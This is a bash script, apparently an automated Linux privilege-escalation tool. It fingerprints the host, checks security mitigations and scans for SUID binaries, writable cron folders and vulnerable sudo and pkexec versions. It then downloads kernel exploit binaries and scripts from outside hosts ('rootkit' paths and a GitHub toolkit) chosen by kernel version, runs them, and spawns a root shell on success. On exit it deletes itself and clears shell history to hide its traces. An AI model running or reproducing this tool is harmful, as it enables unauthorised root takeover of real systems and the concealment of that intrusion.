...
opt_auto_download_lpe=true
opt_auto_run_exploits=true
LPE_REPO_URL="https://raw.githubusercontent.com/khadafigans/LPE-Toolkit/main/xpl2026"
LPE_WORKDIR=""
declare -A LPE_EXPLOITS=(
    ["copyfail-go-static"]="5:7"
    ["dirtyfrag-static"]="5:7"
    ["fragnesia-static"]="5:7"
    ["fragnesia2-static"]="5:7"
    ["dirtydecrypt-static"]="5:7"
    ["pintheft-static"]="5:7"
    ["cifswitch-static"]="5:7"
    ["packet-edit-meme-static"]="5:7"
    ["ipv6-frag-escape-static"]="6:7"
    ["pidfd-race-static"]="5:7"
    ["dirtypipe-static"]="5:5"
    ["pack2theroot-static"]="0:9"
    ["pwnkit-new-static"]="0:9"
    ["overlayfs-static"]="3:5"
    ["ovfs-fuse-static"]="5:9"
    ["polkit-dbus-static"]="0:9"
    ["docker-sock-static"]="0:9"
    ["netfilter-oob-static"]="2:5"
    ["nft-uaf2-static"]="5:5"
    ["nft-uaf-static"]="5:6"
    ["dirtyclone-static"]="7:7"
    ["bad-epoll-static"]="6:6"
    ["fuse-oob-static"]="6:9"
)
_DROOT_ORIG_PWD="$PWD"
DROOT_WORKDIR=$(mktemp -d "${TMPDIR:-/tmp}/droot.XXXXXX") || { echo "Failed to create scratch directory. Aborting." 1>&2; exit 1; }
LPE_WORKDIR=$(mktemp -d "${TMPDIR:-/tmp}/lpe_toolkit.XXXXXX") 2>/dev/null || LPE_WORKDIR=""
_droot_cleanup() {
    cd "$_DROOT_ORIG_PWD" 2>/dev/null
    rm -rf "$DROOT_WORKDIR" 2>/dev/null
    [ -n "$LPE_WORKDIR" ] && rm -rf "$LPE_WORKDIR" 2>/dev/null
    rm -f "$0" 2>/dev/null
    rm -f /tmp/droot.sh /tmp/droot_*.sh 2>/dev/null
    rm -f "$_DROOT_ORIG_PWD"/droot.sh 2>/dev/null
    history -c 2>/dev/null
    unset HISTFILE 2>/dev/null
}
trap _droot_cleanup EXIT INT TERM
cd "$DROOT_WORKDIR" || { echo "Failed to enter scratch directory. Aborting." 1>&2; exit 1; }
declare -a EXPLOITS
...
_ensure_build_deps() {
    ...
    _apt_install "libc6-i386" 2>/dev/null
    _apt_install "lib32gcc-s1" 2>/dev/null
    _apt_install "lib32z1" 2>/dev/null
    for pkg in $extra; do
        _apt_install "$pkg"
    done
    if [ "$(id -u)" -eq 0 ]; then
        echo -e "${LGREEN}[+++] ROOT ACHIEVED DURING BUILD DEPS! ${NC}"
        echo -e "${LGREEN}================================================================${NC}"
        echo -e "${LGREEN}UID: $(id -u) - root${NC}"
        echo -e "${LGREEN}================================================================${NC}"
        _ROOT_ACHIEVED=true
    fi
}
...
_run_exploit() {
    ...
    local id_output
    id_output=$(echo "id" | timeout 120 bash -c "$run_cmd" 2>/dev/null)
    echo "$id_output"
    if echo "$id_output" | grep -qiE "uid=0|root"; then
        _ROOT_ACHIEVED=true
        _root_banner
        echo -e "${LGREEN}[+++] Spawning root shell...${txtrst}"
        if [ -t 0 ]; then
        bash -c "$run_cmd" </dev/tty
    else
        script -q -c "bash -c \"$run_cmd\"" /dev/null
    fi
        exit 0
    fi
    if _check_root; then
...
_run_exploit_2019_13272() {
    ...
    local id_output
    id_output=$(echo "id" | timeout 120 ./ptrace_traceme_root 2>/dev/null)
    echo "$id_output"
    if echo "$id_output" | grep -qiE "uid=0|root"; then
        _ROOT_ACHIEVED=true
        _root_banner
        echo -e "${LGREEN}[+++] Spawning root shell...${txtrst}"
        if [ -t 0 ]; then
        ./ptrace_traceme_root </dev/tty
    else
        script -q -c "./ptrace_traceme_root" /dev/null
    fi
        exit 0
    fi
    if _check_root; then
...
_run_exploit_2025_32463() {
    ...
    if docker build -t sudo-chwoot . 2>&1 | sed 's/^/      /'; then
        ...
        docker run --rm --privileged sudo-chwoot </dev/null
    else
...
spinner() {
    ...
    printf "\r  ${LGREEN}✔${NC}  ${WHITE}%s${NC}${LGREEN} Done!${NC}\n" "$msg"
}
progress_bar() {
    local duration=${1:-2}
    ...
    if command -v awk >/dev/null 2>&1; then
        sleep_time=$(awk -v d="$duration" -v s="$steps" 'BEGIN{printf "%.4f", d/s}')
    else
        sleep_time="0.01"
    fi
    printf "  ${WHITE}%-22s${NC} [" "$label"
    for ((i=0; i<=steps; i++)); do
        local filled=$(( i * width / steps ))
        local pct=$(( i * 100 / steps ))
        printf "\r  ${WHITE}%-22s${NC} [" "$label"
        printf "${LGREEN}%${filled}s${NC}" | tr ' ' '█'
        printf "${DIM}%$((width - filled))s${NC}" | tr ' ' '░'
        printf "] ${YELLOW}%3d%%${NC}" "$pct"
        sleep "$sleep_time"
    done
    printf "\n"
}
banner_line() { echo -e "${DIM}${CYAN}═══════════════════════════════════════════════════════════════════${NC}"; }
thin_line()   { echo -e "${DIM}${GRAY}───────────────────────────────────────────────────────────────────${NC}"; }
section()     { echo -e "\n${BG_DARK}${LCYAN}${BOLD}  ◈  $1  ${NC}\n"; }
ok()          { echo -e "  ${LGREEN}[✔]${NC} ${WHITE}$1${NC}"; }
warn()        { echo -e "  ${YELLOW}[⚠]${NC} ${WHITE}$1${NC}"; }
fail()        { echo -e "  ${RED}[✗]${NC} ${WHITE}$1${NC}"; }
info()        { echo -e "  ${LBLUE}[i]${NC} ${WHITE}$1${NC}"; }
vuln()        { echo -e "  ${LRED}[!]${NC} ${LRED}${BOLD}$1${NC}"; }
sysrow() {
    local label="$1"
    local value="$2"
    printf "  ${CYAN}%-16s${NC}  ${GRAY}│${NC}  ${YELLOW}%s${NC}\n" "$label" "$value"
}
check_tool() {
    local bin="$1" name="$2" vflag="$3"
    if command -v "$bin" &>/dev/null; then
        local ver
        ver=$("$bin" $vflag 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+(\.[0-9]+)?' | head -1)
        row "$name" "OK FOUND" "${ver:-detected}"
    else
        row "$name" "MISSING" "Not in PATH"
    fi
}
row() {
    local label="$1"
    ...
    local detail="$3"
    case "$status" in
        VULN*)     printf "  ${GRAY}│${NC}  ${WHITE}%-28s${NC} ${LRED}${BOLD}%-14s${NC} ${DIM}%s${NC}\n" "$label" "$status" "$detail" ;;
        OK*|SAFE*) printf "  ${GRAY}│${NC}  ${WHITE}%-28s${NC} ${LGREEN}%-14s${NC} ${DIM}%s${NC}\n" "$label" "$status" "$detail" ;;
        WARN*)     printf "  ${GRAY}│${NC}  ${WHITE}%-28s${NC} ${YELLOW}%-14s${NC} ${DIM}%s${NC}\n" "$label" "$status" "$detail" ;;
        *)         printf "  ${GRAY}│${NC}  ${WHITE}%-28s${NC} ${GRAY}%-14s${NC} ${DIM}%s${NC}\n" "$label" "$status" "$detail" ;;
    esac
}
row_header() {
    printf "  ${GRAY}│${NC}  ${CYAN}${BOLD}%-28s  %-14s  %s${NC}\n" "$1" "$2" "$3"
    echo -e "  ${GRAY}│${NC}${DIM}  ─────────────────────────────────────────────────────────${NC}"
}
perform_system_fingerprint() {
    ...
    MEM_FREE=$(awk '/MemAvailable/ {printf "%.0f MB", $2/1024}' /proc/meminfo 2>/dev/null || echo "?")
    UPTIME=$(uptime -p 2>/dev/null || echo "?")
    WHOAMI=$(id -un 2>/dev/null || echo "?")
    GROUPS_VAL=$(id -Gn 2>/dev/null | tr ' ' ',' || echo "?")
    ...
    thin_line
    sysrow "Kernel"       "$KERNEL_VER"
    sysrow "Architecture" "$ARCH"
    sysrow "OS"           "$OS_NAME"
    sysrow "Hostname"     "$HOSTNAME_VAL"
    thin_line
    sysrow "CPU"          "$CPU_MODEL"
    sysrow "Cores"        "$CPU_CORES logical"
    sysrow "Memory"       "$MEM_TOTAL total  /  $MEM_FREE available"
    sysrow "Uptime"       "$UPTIME"
    thin_line
    sysrow "Current User" "$WHOAMI"
    sysrow "Groups"       "$GROUPS_VAL"
    thin_line
    [ "$ARCH" = "aarch64" ] && warn "ARM64 detected — some x86_64 exploits may not apply"
    echo ""
}
perform_security_mitigations_check() {
    section "SECURITY MITIGATIONS"
    echo -e "  ${GRAY}│${NC}"
    row_header "Mitigation" "Status" "Details"
    if command -v aa-status &>/dev/null; then
        AA_STATUS=$(aa-status --enabled 2>/dev/null && echo "ACTIVE" || echo "INACTIVE")
        if [ "$AA_STATUS" = "ACTIVE" ]; then
            row "AppArmor" "WARN ACTIVE" "Profiles loaded"
        else
            row "AppArmor" "OK DISABLED" "Not enforcing"
        fi
    else
        row "AppArmor" "OK N/A" "Not installed"
    fi
    if command -v getenforce &>/dev/null; then
        SE=$(getenforce 2>/dev/null)
        case "$SE" in
            Enforcing)  row "SELinux" "WARN ENFORCING" "Enabled — may block exploits" ;;
            Permissive) row "SELinux" "WARN PERMISSIVE" "Logs only, not blocking" ;;
            *)          row "SELinux" "OK DISABLED"   "Not enforcing" ;;
        esac
    else
        row "SELinux" "OK N/A" "Not installed"
    fi
    ASLR=$(cat /proc/sys/kernel/randomize_va_space 2>/dev/null)
    case "$ASLR" in
        2) row "ASLR" "WARN FULL" "Full randomization active" ;;
        1) row "ASLR" "WARN PARTIAL" "Partial randomization" ;;
        0) row "ASLR" "OK DISABLED" "Address space fixed — exploitable" ;;
        *) row "ASLR" "MISSING" "Could not read" ;;
    esac
    SMEP=$(grep -m1 smep /proc/cpuinfo 2>/dev/null && echo "YES" || echo "NO")
    SMAP=$(grep -m1 smap /proc/cpuinfo 2>/dev/null && echo "YES" || echo "NO")
    [ "$SMEP" = "YES" ] && row "SMEP" "WARN ENABLED" "Supervisor Mode Exec Protection" \
                         || row "SMEP" "OK DISABLED" "No SMEP"
    [ "$SMAP" = "YES" ] && row "SMAP" "WARN ENABLED" "Supervisor Mode Access Protection" \
                         || row "SMAP" "OK DISABLED" "No SMAP"
    SEC=$(cat /proc/1/status 2>/dev/null | grep Seccomp | awk '{print $2}')
    case "$SEC" in
        2) row "Seccomp"  "WARN STRICT"  "Strict mode on PID 1" ;;
        1) row "Seccomp"  "WARN FILTER"  "BPF filter active" ;;
        *) row "Seccomp"  "OK DISABLED"  "Not enforcing" ;;
    esac
    echo -e "  ${GRAY}│${NC}"
}
perform_toolchain_check() {
    section "TOOLCHAIN AVAILABILITY"
    echo -e "  ${GRAY}│${NC}"
    row_header "Tool" "Status" "Version"
    ...
    if command -v wget &>/dev/null && wget -q --spider http://example.com 2>/dev/null; then
        row "Outbound HTTP" "OK REACHABLE" "Connectivity"
    elif command -v curl &>/dev/null && curl -sf --max-time 3 http://example.com &>/dev/null; then
        row "Outbound HTTP" "OK REACHABLE" "Connectivity"
    else
        row "Outbound HTTP" "WARN BLOCKED?" "Cannot reach external host"
    fi
    echo -e "  ${GRAY}│${NC}"
}
perform_privesc_vectors_scan() {
    section "PRIVILEGE ESCALATION VECTORS"
    echo ""
    progress_bar 2.0 "Scanning local vectors"
    echo ""
    echo -e "  ${GRAY}│${NC}"
    row_header "Vector" "Status" "CVE / Notes"
    if command -v sudo &>/dev/null; then
        SUDO_VER=$(sudo --version 2>/dev/null | head -1 | awk '{print $3}')
        SUDO_VULN=0
        if [[ "$SUDO_VER" =~ ^1\.(8\.|9\.[0-4]) ]]; then
            row "Sudo — Baron Samedit" "VULN" "$SUDO_VER  →  heap overflow"
            SUDO_VULN=1
        fi
        if [[ "$SUDO_VER" == "1.8.28" ]]; then
            row "Sudo — RunAs ANY" "VULN" "$SUDO_VER  →  -u#-1 bypass"
            SUDO_VULN=1
        fi
        if [[ "$SUDO_VER" =~ ^1\.9\.12 ]]; then
            row "Sudo — Sudoedit" "VULN" "$SUDO_VER  →  arbitrary file edit"
            SUDO_VULN=1
        fi
        [ $SUDO_VULN -eq 0 ] && row "Sudo" "OK SAFE" "$SUDO_VER — no known CVE match"
    else
        row "Sudo" "MISSING" "Not installed"
    fi
    thin_line
    if command -v pkexec &>/dev/null; then
        PKEXEC_VER=$(pkexec --version 2>/dev/null | awk '{print $3}' | head -1)
        if [ -f /usr/lib/polkit-1/polkitd ] || command -v polkitd &>/dev/null; then
            row "Pkexec — PwnKit" "VULN" "${PKEXEC_VER:-unknown}  →  SUID EoP"
        else
            row "Pkexec" "OK SAFE" "${PKEXEC_VER:-unknown} — polkitd not found"
        fi
    else
        row "Pkexec" "MISSING" "Not installed"
    fi
    thin_line
    echo -e "  ${GRAY}│${NC}  ${CYAN}${BOLD}SUID Binaries of Interest${NC}"
    echo -e "  ${GRAY}│${NC}${DIM}  ──────────────────────────────────────────────────────────${NC}"
    INTEREST_BINS=(vim nano less more awk python python3 perl ruby find bash sh cp mv tee)
    FOUND_SUID=0
    for bin in "${INTEREST_BINS[@]}"; do
        BIN_PATH=$(command -v "$bin" 2>/dev/null)
        if [ -n "$BIN_PATH" ] && [ -u "$BIN_PATH" ]; then
            row "$bin" "VULN SUID SET" "$(ls -lh "$BIN_PATH" 2>/dev/null | awk '{print $1,$3,$4}')"
            FOUND_SUID=1
        fi
    done
    [ $FOUND_SUID -eq 0 ] && row "SUID scan" "OK CLEAN" "No SUID binaries found"
    thin_line
    WCRON=0
    for crondir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /var/spool/cron; do
        if [ -d "$crondir" ] && [ -w "$crondir" ]; then
            row "Writable Cron" "VULN $crondir" "World-writable cron directory"
            WCRON=1
        fi
    done
    [ $WCRON -eq 0 ] && row "Cron directories" "OK SAFE" "No writable cron found"
    echo -e "  ${GRAY}│${NC}"
}
check_password() {
    local password=""
    ...
    if [ -t 0 ] && [ -r /dev/tty ]; then
        ...
        password="dcecommunity2026"
        printf " Auto-Auth Mode (Server Environment)\n"
    fi
...
download_file() {
    ...
    local timeout=30
    { [ -z "$url" ] || [ -z "$output" ]; } && {
        echo "[ERROR] URL atau Output kosong!"
        return 1
    }
    for attempt in $(seq 1 $retry); do
        if command -v wget >/dev/null 2>&1; then
            timeout $timeout wget -q --no-check-certificate -O "$output" "$url" 2>/dev/null
        ...
        if command -v curl >/dev/null 2>&1; then
            timeout $timeout curl -fsSLk -o "$output" "$url" 2>/dev/null
            if [ $? -eq 0 ] && [ -f "$output" ] && [ -s "$output" ]; then
                chmod +x "$output" 2>/dev/null
                return 0
            fi
        fi
        [ $attempt -lt $retry ] && sleep 2
    done
...
check_root_achieved() {
    if [ "$(id -u)" -eq 0 ]; then
        echo -e "${LGREEN}[+++] ROOT ACHIEVED! ${NC}"
        echo -e "${LGREEN}================================================================${NC}"
        echo -e "${LGREEN}Current UID: $(id -u) - PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
        echo -e "${LGREEN}================================================================${NC}"
        _ROOT_ACHIEVED=true
        return 0
    fi
...
download_and_run() {
    ...
    download_file "$url" "$output" || {
        echo -e "${RED}[!] Download gagal untuk $output${NC}"
        return 1
    }
    chmod +x "$output" 2>/dev/null
    echo -e "${YELLOW}[*] Executing: $output${NC}"
    local id_out
    id_out=$(echo "id" | timeout 30 "./$output" 2>/dev/null)
    echo "$id_out"
    if echo "$id_out" | grep -qiE "uid=0|root" || [ "$(id -u)" -eq 0 ]; then
        echo -e "${LGREEN}[+] Exploit $output SUCCESS!${NC}"
        _ROOT_ACHIEVED=true
        _root_banner
        echo -e "${LGREEN}[+++] Spawning root shell...${txtrst}"
        if [ -t 0 ]; then
        ...
        script -q -c "./$output" /dev/null
    fi
        exit 0
    else
        echo -e "${YELLOW}[*] Exploit $output completed${NC}"
    fi
    rm -rf "$output" 2>/dev/null
}
download_compile_run() {
    local url="$1"
    local source_file="$2"
    local output_binary="$3"
    local compile_cmd="$4"
    local run_cmd="$5"
    echo -e "${LBLUE}[*] Starting: $output_binary${NC}"
    echo -e "${LBLUE}[*] Downloading source code...${NC}"
    download_file "$url" "$source_file" || {
        echo -e "${RED}[✗] Download gagal untuk $source_file${NC}"
        return 1
    }
    echo -e "${LBLUE}[*] Compiling with: $compile_cmd${NC}"
    if eval "$compile_cmd" 2>&1 | tee compile.log > /dev/null; then
        echo -e "${LGREEN}[✔] Compilation successful${NC}"
    else
        echo -e "${RED}[✗] Compilation failed!${NC}"
        cat compile.log | head -20
        rm -f "$source_file" compile.log
        return 1
    fi
    if [ -f "$output_binary" ]; then
        ...
        local id_out2
        id_out2=$(echo "id" | timeout 30 bash -c "$run_cmd" 2>/dev/null)
        echo "$id_out2"
        if echo "$id_out2" | grep -qiE "uid=0|root" || [ "$(id -u)" -eq 0 ]; then
            echo -e "${LGREEN}[+] Exploit $output_binary SUCCESS!${NC}"
            _ROOT_ACHIEVED=true
            _root_banner
            echo -e "${LGREEN}[+++] Spawning root shell...${txtrst}"
            if [ -t 0 ]; then
        ...
        script -q -c "bash -c \"$run_cmd\"" /dev/null
            ...
            echo -e "${YELLOW}[*] Exploit execution completed${NC}"
        fi
    else
        echo -e "${RED}[✗] Compilation produced no output!${NC}"
    fi
    rm -f "$source_file" "$output_binary" compile.log 2>/dev/null
}
check_password
KERNEL_VER=$(uname -r)
KERNEL_MAJOR=$(echo "$KERNEL_VER" | cut -d'.' -f1)
echo ""
echo -e "${txtgrn}[+] Kernel: $KERNEL_VER${txtrst}"
echo ""
EXPLOIT_COUNT=0
EXPLOIT_SUCCESS=0
case $KERNEL_MAJOR in
    3)
        sleep 1
        EXPLOIT_COUNT=$((EXPLOIT_COUNT + 7))
        download_and_run "https://t1.youpilab.com/rootkit/2015/CVE-2015-1328" "CVE-2015-1328"
        download_and_run "https://t1.youpilab.com/rootkit/2015/CVE-2015-8550" "CVE-2015-8550"
        download_and_run "https://t1.youpilab.com/rootkit/2016/CVE-2016-8655" "CVE-2016-8655"
        download_and_run "https://t1.youpilab.com/rootkit/2016/CVE-2016-9793" "CVE-2016-9793"
        download_and_run "https://t1.youpilab.com/rootkit/2017/CVE-2017-1000112" "CVE-2017-1000112"
        download_and_run "https://t1.youpilab.com/rootkit/2017/CVE-2017-16995" "CVE-2017-16995"
        download_and_run "https://t1.youpilab.com/rootkit/2017/CVE-2017-7308" "CVE-2017-7308"
    ;;
    4)
        sleep 1
        EXPLOIT_COUNT=$((EXPLOIT_COUNT + 7))
        ...
        download_and_run "https://t1.youpilab.com/rootkit/2017/CVE-2017-16995" "CVE-2017-16995"
        download_and_run "https://t1.youpilab.com/rootkit/2017/CVE-2017-7308" "CVE-2017-7308"
        download_and_run "https://t1.youpilab.com/rootkit/2018/CVE-2018-5333" "CVE-2018-5333"
        download_and_run "https://t1.youpilab.com/rootkit/2020/CVE-2020-8835" "CVE-2020-8835"
        download_and_run "https://t1.youpilab.com/rootkit/2021/CVE-2021-22555" "CVE-2021-22555"
        download_and_run "https://t1.youpilab.com/rootkit/2021/CVE-2021-3493" "CVE-2021-3493"
    ;;
    5)
        sleep 1
        EXPLOIT_COUNT=$((EXPLOIT_COUNT + 7))
        download_and_run "https://t1.youpilab.com/rootkit/2021/CVE-2021-22555" "CVE-2021-22555"
        download_and_run "https://t1.youpilab.com/rootkit/2021/CVE-2021-3493" "CVE-2021-3493"
        download_and_run "https://t1.youpilab.com/rootkit/2022/CVE-2022-0847-DirtyPipe-Exploits/exploit-1" "dirtypipe-1"
        download_and_run "https://t1.youpilab.com/rootkit/2022/CVE-2022-0995" "cve-2022-0995"
        download_and_run "https://t1.youpilab.com/rootkit/2023/CVE-2023-2163" "CVE-2023-2163"
        download_and_run "https://t1.youpilab.com/rootkit/2024/CVE-2024-1086" "CVE-2024-1086"
        download_and_run "https://t1.youpilab.com/rootkit/cve-2023-0386" "cve-2023-0386"
    ;;
    6)
        sleep 1
        EXPLOIT_COUNT=$((EXPLOIT_COUNT + 5))
        download_and_run "https://t1.youpilab.com/rootkit/2024/CVE-2024-46852" "CVE-2024-46852"
        download_and_run "https://t1.youpilab.com/rootkit/2025/CVE-2025-21692" "CVE-2025-21692"
        download_and_run "https://t1.youpilab.com/rootkit/cve-2022-0995" "cve-2022-0995"
        download_and_run "https://t1.youpilab.com/rootkit/SKELETONKEY/skeletonkey" "skeletonkey"
        echo -e "${LBLUE}[*] Attempting CVE-2026-31431 (CopyFail) exploit...${NC}"
        download_file "https://raw.githubusercontent.com/theori-io/copy-fail-CVE-2026-31431/main/copy_fail_exp.py" "copy_fail_exp.py"
        if [ -f "copy_fail_exp.py" ]; then
            if command -v python3 &> /dev/null; then
                echo -e "${LBLUE}[*] Running with Python3...${NC}"
                local id_out3
                id_out3=$(echo "id" | timeout 30 python3 copy_fail_exp.py 2>/dev/null)
                echo "$id_out3"
                if echo "$id_out3" | grep -qiE "uid=0|root" || [ "$(id -u)" -eq 0 ]; then
                    _ROOT_ACHIEVED=true
                    _root_banner
                    echo -e "${LGREEN}[+++] Spawning root shell...${txtrst}"
                    if [ -t 0 ]; then
        python3 copy_fail_exp.py </dev/tty
    else
        script -q -c "python3 copy_fail_exp.py" /dev/null
    fi
                    exit 0
                fi
            elif command -v python &> /dev/null; then
                echo -e "${LBLUE}[*] Running with Python...${NC}"
                local id_out4
                id_out4=$(echo "id" | timeout 30 python copy_fail_exp.py 2>/dev/null)
                echo "$id_out4"
                if echo "$id_out4" | grep -qiE "uid=0|root" || [ "$(id -u)" -eq 0 ]; then
                    _ROOT_ACHIEVED=true
                    _root_banner
                    echo -e "${LGREEN}[+++] Spawning root shell...${txtrst}"
                    if [ -t 0 ]; then
        python copy_fail_exp.py </dev/tty
    else
        script -q -c "python copy_fail_exp.py" /dev/null
    fi
                    exit 0
                fi
            else
                echo -e "${RED}[!] Python not found, skipping CopyFail exploit${NC}"
            fi
            rm -f copy_fail_exp.py
        fi
    ;;
    *)
        echo -e "${RED}[!] Kernel version $KERNEL_MAJOR.x is not yet supported in automated exploitation mode${NC}"
        echo -e "${YELLOW}[*] Proceeding to CVE vulnerability scanning and analysis...${NC}"
        echo ""
    ;;
esac
if [ "$_ROOT_ACHIEVED" = "true" ]; then
    ...
    echo -e "${LGREEN}===============================================${NC}"
    echo ""
    echo -e "${LGREEN}[+] Exploitation mission completed successfully!${NC}"
    echo ""
fi
echo ""
...
[ -n "$PKGLIST_FILE" ] && [[ "$PKGLIST_FILE" != /* ]] && PKGLIST_FILE="$_DROOT_ORIG_PWD/$PKGLIST_FILE"
[ -n "$CVELIST_FILE" ] && [[ "$CVELIST_FILE" != /* ]] && CVELIST_FILE="$_DROOT_ORIG_PWD/$CVELIST_FILE"
...
for EXP_TEMP in "${SORTED_EXPLOITS[@]}"; do
    ...
    if [ $opt_fetch_bins = "true" ]; then
        for i in $(echo "$EXP" | grep "bin-url: " | awk '{print $2}'); do
            out="$_DROOT_ORIG_PWD/${name}_$(basename $i)"
            [ -f "$out" ] && rm -f "$out"
            _download "$i" "$out"
        done
    fi
    if [ $opt_fetch_srcs = "true" ]; then
        out="$_DROOT_ORIG_PWD/${name}_$(basename $src_url)"
        [ -f "$out" ] && rm -f "$out"
        _download "$src_url" "$out" &
    fi
    echo -e "  ${txtred}[VULNERABLE]${txtrst}  $NAME"
    if [ "$(id -u)" -eq 0 ]; then
        echo -e "  ${LGREEN}[+++] ROOT ACHIEVED!${txtrst}"
        echo -e "  ${LGREEN}Current UID: $(id -u) (root) - Stopping exploitation${txtrst}"
        break
    fi
...
if [ "$opt_auto_download_lpe" = "true" ]; then
    echo ""
    echo ""
    ...
    echo -e "${txtgrn}[+] Detected kernel: $KERNEL_VERSION (v$KERNEL_MAJOR.$KERNEL_MINOR)${txtrst}"
    echo ""
    MATCHING_EXPLOITS=()
    for binary in "${!LPE_EXPLOITS[@]}"; do
        RANGE="${LPE_EXPLOITS[$binary]}"
        MIN_VER=$(echo "$RANGE" | cut -d':' -f1)
        MAX_VER=$(echo "$RANGE" | cut -d':' -f2)
        MIN_NUM=$((MIN_VER * 100))
        MAX_NUM=$((MAX_VER * 100))
        if [ "$KERNEL_NUM" -ge "$MIN_NUM" ] && [ "$KERNEL_NUM" -le "$MAX_NUM" ]; then
            MATCHING_EXPLOITS+=("$binary")
            echo -e "${txtgrn}[✓]${txtrst} Compatible: $binary (kernel $MIN_VER.x - $MAX_VER.x)"
        fi
    done
    echo ""
    if [ ${#MATCHING_EXPLOITS[@]} -eq 0 ]; then
        echo -e "${txtred}[-] No compatible exploits found for kernel $KERNEL_VERSION${txtrst}"
    else
        echo -e "${txtgrn}[+] Found ${#MATCHING_EXPLOITS[@]} compatible exploits${txtrst}"
        echo ""
        if [ "$opt_auto_run_exploits" = "true" ]; then
            for binary in "${MATCHING_EXPLOITS[@]}"; do
                echo -e "${txtgrn}[*] Testing: $binary${txtrst}"
                DL_URL="$LPE_REPO_URL/$binary"
                DL_PATH="$LPE_WORKDIR/$binary"
                if command -v curl &>/dev/null; then
                    curl -sSL -o "$DL_PATH" "$DL_URL" 2>/dev/null || continue
                elif command -v wget &>/dev/null; then
                    wget -q -O "$DL_PATH" "$DL_URL" 2>/dev/null || continue
                else
                    break
                fi
                chmod +x "$DL_PATH"
                local lpe_id_out
                lpe_id_out=$(echo "id" | timeout 120 "$DL_PATH" 2>/dev/null)
                echo "$lpe_id_out"
                if echo "$lpe_id_out" | grep -qiE "uid=0|root" || [ "$(id -u)" -eq 0 ]; then
                    echo -e "${LGREEN}[+++] ROOT ACHIEVED${txtrst}"
                    echo -e "${LGREEN}UID: $(id -u)${txtrst}"
                    _ROOT_ACHIEVED=true
                    echo -e "${LGREEN}[+++] Spawning root shell...${txtrst}"
                    if [ -t 0 ]; then
        "$DL_PATH" </dev/tty
    else
        script -q -c "\"$DL_PATH\"" /dev/null
    fi
                    exit 0
                fi
            done
...
echo ""
echo -e "${txtgrn}[*] Exploitation complete${txtrst}"
echo ""
exit 0
